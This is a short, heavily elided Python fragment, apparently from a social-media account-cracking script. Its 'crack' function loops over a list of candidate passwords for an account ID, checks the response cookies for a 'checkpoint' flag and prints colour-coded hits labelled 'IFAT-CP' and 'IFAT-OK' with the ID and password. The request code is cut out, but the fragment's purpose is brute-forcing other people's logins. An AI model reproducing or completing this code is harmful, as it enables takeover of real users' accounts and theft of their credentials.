...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [IFAT]   {P}{H}{loop} \033[1;32m{P}{P}{H}=\033[1;92m {ok}\r\r\033[1;32m{P} \033[1;31m "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\033[1;31m [ IFAT-CP ]\033[1;31m  {idf}\033[1;31m |\033[1;31m {pw}')
				...
				print(f'\r\r\033[1;92m [ IFAT-OK ]\033[1;192m  {idf} \033[1;197m| \033[1;32m{pw}')
